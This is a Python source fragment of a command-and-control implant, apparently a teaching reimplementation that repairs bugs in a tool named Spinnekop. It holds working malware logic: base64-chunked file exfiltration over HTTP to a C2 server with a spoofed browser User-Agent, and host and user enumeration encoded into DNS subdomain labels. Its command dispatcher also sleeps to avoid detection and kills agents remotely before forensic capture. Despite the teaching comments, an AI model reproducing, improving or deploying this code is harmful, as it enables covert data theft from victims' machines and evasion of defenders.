_file_transferred = False
_http_lock        = threading.Lock()


def contact_http_server(server_url: str) -> bool:
    """
    Verify HTTP connectivity. Returns True if server responds.
    Equivalent to Spinnekop httpclient.ContactServer().
    """
    import urllib.request
    import urllib.error
    url = server_url.rstrip("/") + "/"
    try:
        req = urllib.request.Request(url)
        req.add_header("User-Agent",
                       "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                       "AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36")
        with urllib.request.urlopen(req, timeout=10) as resp:
            body = resp.read().decode(errors="replace")
            print(f"  [http] Server response: {body[:80]}")
            return True
    except Exception as e:
        print(f"  [http] Connection failed: {e}")
        return False


def transfer_file(server_url: str, filepath: str,
                  chunk_size: int = 1024 * 1024,
                  agent_id: str = "unknown") -> None:
    """
    Transfer file to C2 HTTP server in base64 chunks.
    Fixes Spinnekop:
      - Uses configurable server_url (not hardcoded 172.208.51.75)
      - Sends agent_id in upload URL (agent-guide design, not the bug)
      - Uses configurable chunk_size
    """
    global _file_transferred
    with _http_lock:
        if _file_transferred:
            print("  [http] File already transferred — skipping")
            return

    import urllib.request
    import urllib.error

    if not os.path.exists(filepath):
        print(f"  [http] Target file not found: {filepath}")
        print("  [http] Creating dummy payload for demo...")
        with open(filepath, "wb") as f:
            f.write(b"DEMO PAYLOAD - " + os.urandom(128))

    print(f"  [http] Reading {filepath}...")
    with open(filepath, "rb") as f:
        raw_data = f.read()

    encoded     = base64.b64encode(raw_data).decode()
    total_bytes = len(raw_data)
    total_chunks= (len(encoded) + chunk_size - 1) // chunk_size

    print(f"  [http] Transferring {total_bytes} bytes in {total_chunks} chunk(s) "
          f"[agent_id={agent_id}]")

    for i in range(total_chunks):
        start = i * chunk_size
        end   = min(start + chunk_size, len(encoded))
        chunk = encoded[start:end].encode()

        # Fix: URL includes agent_id (Spinnekop's documented design)
        url = (f"{server_url.rstrip('/')}/upload"
               f"?agent_id={agent_id}&chunk={i}&total={total_chunks}")
        req = urllib.request.Request(url, data=chunk, method="POST")
        req.add_header("Content-Type", "text/plain")
        req.add_header("User-Agent",
                       "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120")

        try:
            with urllib.request.urlopen(req, timeout=30) as resp:
                resp.read()
            print(f"  [http] Sent chunk {i+1}/{total_chunks} "
                  f"({end-start} chars)")
        except Exception as e:
            print(f"  [http] Error on chunk {i}: {e}")
            return

    with _http_lock:
        _file_transferred = True
    print("  [http] ✅ File transfer complete")


# ─────────────────────────────────────────────────────────────
#  Z-VALUE DISPATCHER
#  Mirrors + FIXES Spinnekop cmd/agent/main.go zValueDispatcher()
#
#  Spinnekop bugs fixed:
#    - Z=7 TERMINATE: was default: → printed message, did nothing
#    - Z=2 ENUMERATE: called GenerateRandom() stub, hardcoded strings
#    - Z=3 HTTP_MODE: missing agent_id, hardcoded server IP
# ─────────────────────────────────────────────────────────────

class ZDispatcher:
    """
    Dispatches Z-value commands to the appropriate agent action.
    All 8 possible Z-values (0-7) are explicitly handled.
    """

    def __init__(self, config: dict, ctx):
        self.cfg = config
        self.ctx = ctx  # AgentContext
        self._use_random_subdomain = False

    def dispatch(self, z: int) -> None:
        cmd = Z_COMMAND_MAP.get(z, f"UNKNOWN({z})")
        print(f"\n  📡 Z={z} received: {cmd}")

        if z == 0:
            self._handle_continue()
        elif z == 1:
            self._handle_sleep()
        elif z == 2:
            self._handle_enumerate()
        elif z == 3:
            self._handle_http_mode()
        elif z in (4, 5, 6):
            self._handle_reserved(z)
        elif z == 7:
            self._handle_terminate()  # FIX: was default:, did nothing
        else:
            print(f"  [warn] Unrecognised Z-value {z} (out of 0-7 range)")

    # ── Z=0: CONTINUE ────────────────────────────────────────
    def _handle_continue(self) -> None:
        """No special action — continue normal beaconing."""
        print("  [z=0] Continuing normal beacon loop")

    # ── Z=1: SLEEP ───────────────────────────────────────────
    def _handle_sleep(self) -> None:
        """
        Enter extended sleep (1 hour, once).
        Teaching point: reduces detection risk when operator suspects
        the C2 is being monitored — agent goes quiet for an hour.
        """
        should_sleep, duration = handle_z_one()
        if should_sleep:
            print(f"\n  ⏰ Z=1: Entering 1-hour sleep (detection avoidance)...")
            end_time = time.time() + duration
            while time.time() < end_time and not self.ctx.shutdown_event.is_set():
                remaining = end_time - time.time()
                if int(remaining) % 300 == 0 and remaining > 1:
                    print(f"  [z=1] Sleeping... {remaining/60:.0f} min remaining")
                time.sleep(min(60.0, remaining))
            print("  [z=1] Sleep complete — resuming beaconing")
        else:
            print("  [z=1] One-hour sleep already completed this session")

    # ── Z=2: ENUMERATE ───────────────────────────────────────
    def _handle_enumerate(self) -> None:
        """
        Enable subdomain data encoding.
        FIX: Real system enumeration (was a hardcoded counter stub).

        On next beacon, hostname\\user\\os\\ip is Base64-encoded into
        the subdomain label: <b64data>.timeserversync.com
        """
        print("  [z=2] ENUMERATE: Collecting system information...")
        info = collect_system_info()
        label = encode_system_info_for_subdomain(info)
        print(f"  [z=2] System info: {info}")
        print(f"  [z=2] Encoded label ({len(label)} chars): {label}")
        print(f"  [z=2] Next beacon will use: {label}.{self._base_domain()}")
        self._use_random_subdomain = True
        self.ctx.enumeration_label = label

    # ── Z=3: HTTP_MODE ───────────────────────────────────────
    def _handle_http_mode(self) -> None:
        """
        Switch to HTTPS exfil channel.
        FIX: server URL is configurable, agent_id sent in upload URL.

        Steps:
          1. Verify HTTP connectivity
          2. Transfer target file in chunks
          3. Continue HTTP beaconing (periodic contact)
        """
        http_cfg = self.cfg.get("http", {})
        url      = http_cfg.get("server_url", "http://127.0.0.1:8080")
        filepath = http_cfg.get("target_file", "dummy.zip")
        chunk_sz = http_cfg.get("chunk_size", 1024 * 1024)

        print(f"  [z=3] Testing HTTP connectivity → {url}")
        if contact_http_server(url):
            print("  [z=3] HTTP server reachable — switching to HTTP mode")
            # Transfer file with agent_id (fixes Spinnekop gap)
            threading.Thread(
                target=transfer_file,
                args=(url, filepath, chunk_sz, AGENT_ID),
                daemon=True,
            ).start()
            self.ctx.http_mode = True
            self.ctx.http_url  = url
        else:
            print("  [z=3] HTTP server unreachable — staying in DNS mode")

    # ── Z=4, Z=5, Z=6: RESERVED ─────────────────────────────
    def _handle_reserved(self, z: int) -> None:
        """
        Reserved for future commands.
        Teaching point: 3 Z-bits give 8 values total. 4 are defined,
        3 are reserved. Attackers could extend the protocol here.
        """
        print(f"  [z={z}] Reserved command — no action (future use)")

    # ── Z=7: TERMINATE ───────────────────────────────────────
    def _handle_terminate(self) -> None:
        """
        FIX: Spinnekop's zValueDispatcher hit default: for Z=7.
        This implementation actually terminates the agent.

        Teaching point: Z=7 allows the operator to remotely kill
        agents before forensic capture — emergency extraction.
        """
        print("\n  🛑 Z=7: TERMINATE received — agent shutting down cleanly")
        print("  [z=7] Stopping all network activity...")
        self.ctx.shutdown_event.set()

    def _base_domain(self) -> str:
        return self.cfg.get("question", {}).get("name", "c2domain.com.").lstrip("www.")

    def current_subdomain(self) -> Optional[str]:
        if self._use_random_subdomain:
            return getattr(self.ctx, "enumeration_label", None)
        return None


